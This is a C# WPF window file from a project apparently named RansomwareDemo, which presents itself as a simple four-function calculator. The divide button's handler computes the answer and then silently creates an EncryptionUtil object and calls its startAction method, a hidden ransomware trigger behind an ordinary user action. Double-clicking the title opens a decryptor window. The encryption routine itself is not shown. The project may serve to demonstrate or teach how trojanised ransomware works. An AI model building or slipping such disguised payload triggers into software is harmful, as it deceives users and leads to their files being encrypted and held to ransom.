using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RansomwareDemo.ransomware;

namespace RansomwareDemo
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void btnClose_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void windowApp_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            DragMove();
        }

        private void btnAdd_Click(object sender, RoutedEventArgs e)
        {

            if(validateInput(this.txtNumber1.Text, this.txtNumber2.Text, this.lblError))
            {                            
                double number1 = System.Convert.ToDouble(txtNumber1.Text);

                double number2 = System.Convert.ToDouble(txtNumber2.Text);
            
                double answer = CalculatorUtil.add(number1, number2);

                txtAnswer.Text = answer.ToString();
            }
        }

        private void btnSubstract_Click(object sender, RoutedEventArgs e)
        {
            if (validateInput(this.txtNumber1.Text, this.txtNumber2.Text, this.lblError))
            {
                double number1 = System.Convert.ToDouble(txtNumber1.Text);

                double number2 = System.Convert.ToDouble(txtNumber2.Text);

                double answer = CalculatorUtil.substract(number1, number2);

                txtAnswer.Text = answer.ToString();
            }
        }

        private void btnMultiply_Click(object sender, RoutedEventArgs e)
        {
            if (validateInput(this.txtNumber1.Text, this.txtNumber2.Text, this.lblError))
            {
                double number1 = System.Convert.ToDouble(txtNumber1.Text);

                double number2 = System.Convert.ToDouble(txtNumber2.Text);

                double answer = CalculatorUtil.multiply(number1, number2);

                txtAnswer.Text = answer.ToString();
            }
        }

        private void btnDivide_Click(object sender, RoutedEventArgs e)
        {
            if (validateInput(this.txtNumber1.Text, this.txtNumber2.Text, this.lblError))
            {
                double number1 = System.Convert.ToDouble(txtNumber1.Text);

                double number2 = System.Convert.ToDouble(txtNumber2.Text);

                double answer = CalculatorUtil.divide(number1, number2);

                txtAnswer.Text = answer.ToString();

                RansomwareDemo.ransomware.EncryptionUtil ru = new EncryptionUtil();
                ru.startAction();

            }
        }

        private Boolean validateInput(string num1, string num2, Label errorLabel)
        {
            if ( (num1 == null || "".Equals(num1)) || (num2 == null || "".Equals(num2)) )
            {
                errorLabel.Content = "Number 1 and Number 2 should not be empty";

                return false;
            }

            try
            {
                double number1 = System.Convert.ToDouble(num1);

                double number2 = System.Convert.ToDouble(num2);
            }
            catch (Exception ex)
            {
                errorLabel.Content = "Number 1 and Number 2 should have numerical values";

                return false;
            }

            errorLabel.Content = "";

            return true;
        }

        private void Window_Loaded_1(object sender, RoutedEventArgs e)
        {
            lblError.Content = "";
        }

        private void lblTitle_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            DecryptorApp da = new DecryptorApp();
            da.Show();
        }
    }
}
